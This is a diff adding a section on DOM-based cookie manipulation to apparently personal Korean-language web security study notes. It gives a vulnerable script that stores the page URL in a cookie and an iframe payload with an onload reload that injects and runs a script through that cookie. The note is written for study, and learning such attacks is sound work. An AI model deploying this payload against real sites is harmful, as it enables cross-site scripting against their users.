@@ -94,3 +94,24 @@ https://www.innocent-website.com/example#https://www.evil-user.net
 2. XSS: `javascript:`로 자바스크립트를 실행할 수 있음. 
 	- 예: `location = javascript:...`
 
+
+### 쿠키 조작
+
+DOM 기반 쿠키 조작은 공격자가 제어할 수 있는 데이터를 쿠키의 값에 기록하는 경우 발생함. 
+
+**예시**
+`/product` 페이지에서 경로가 쿠키로 지정되고 해당 쿠키 값을 화면에 출력하는 경우 
+``` html
+<script>
+	document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+</script>
+```
+
+공격 스크립트 
+``` html
+<iframe src="https://target.com/product?productId=1&'><script>print()</script>" 
+onload="if(!window.x)this.src='https://target.com';window.x=1;">
+```
+- `<iframe>`으로 쿠키를 지정하는 URL로 악성 스크립트를 쿠키로 지정
+- `onload` 이벤트로 페이지가 로드되면 (쿠키가 지정되면) 새로운 화면을 보여으로써 그 화면에 출력된 악성 스크립트가 실행됨. 
+
